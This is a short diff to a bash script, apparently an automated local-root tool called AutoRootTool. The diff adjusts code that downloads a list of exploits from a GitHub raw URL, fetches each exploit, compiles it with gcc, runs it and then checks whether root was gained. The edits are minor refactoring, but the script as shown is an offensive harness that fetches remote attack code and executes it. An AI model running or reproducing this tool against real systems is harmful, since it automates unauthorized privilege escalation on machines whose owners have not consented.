@@ -21,7 +21,6 @@ CC(){
 	gcc $OPTS -o exploit exploit.c >> /dev/null
 	if [ $? == 0 ]; then
 		./exploit
-		check_root
 	fi
 }
 
@@ -63,7 +62,8 @@ main(){
 	download_list https://raw.githubusercontent.com/daedalus/AutoRootTool/master/c_exploitlist.txt
 	while read line;
 	do
-		download_exploit $line; execute_exploit
+		download_exploit $line; 
+		execute_exploit
 		checkroot
 	done < sort -u -n c_exploitlist.txt
 	clean_up
@@ -71,4 +71,3 @@ main(){
 }
 
 main
-
